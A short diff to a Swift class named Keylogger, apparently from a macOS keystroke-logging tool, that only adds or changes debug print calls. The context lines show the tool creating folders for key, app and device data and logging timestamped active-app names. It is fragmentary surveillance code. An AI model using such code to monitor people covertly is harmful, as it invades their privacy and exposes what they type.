@@ -22,7 +22,7 @@ class Keylogger
     
     init()
     {
-        print("init")
+        print("init", bundlePathURL)
         appData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("App") // Creates App Folder in Data Folder
         keyData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Key") // Creates Key Folder in Data Folder
         devicesData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Devices") // Creates Devices Folder in Data Folder
@@ -113,7 +113,7 @@ class Keylogger
             fh?.seekToEndOfFile()
             let timeStamp = Date().description(with: Locale.current) +  "\t\(self.appName)" + "\n"
             fh?.write(timeStamp.data(using: .utf8)!)
-            print(timeStamp.data(using: .utf8)!)
+            print("activatedApp: ", self.appName)
         }
     }
 
@@ -124,6 +124,7 @@ class Keylogger
         
         let resultAsSwiftDic = [kIOHIDDeviceUsagePageKey: inUsagePage, kIOHIDDeviceUsageKey : inUsage]
         let resultAsCFDic: CFMutableDictionary = resultAsSwiftDic as! CFMutableDictionary
+        print("result: ", resultAsCFDic)
         return resultAsCFDic
     }
     
